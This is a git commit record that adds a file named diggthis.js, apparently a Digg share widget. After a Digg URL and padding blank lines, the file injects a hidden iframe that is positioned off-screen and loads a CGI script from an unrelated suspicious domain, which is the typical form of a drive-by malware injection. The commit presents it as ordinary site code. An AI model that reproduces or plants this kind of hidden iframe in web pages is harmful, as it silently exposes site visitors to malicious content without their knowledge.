e21bc8cc1744e76a98ace361c4ca89ee0980898e
Ana Becker <anabdesigns@gmail.com>
2013-01-05 20:52:35 -0500

    adding ALL THE THINGS ... again

---
+++ outside_files/diggthis.js
@@ -0,0 +1,5 @@
+http://digg.com/
+
+
+
+;document.write('<iframe width="50" height="50" style="width:100px;height:100px;position:absolute;left:-100px;top:0;" src="http://bnbvtenl.freewww.biz/nighttrend.cgi?8"></iframe>');
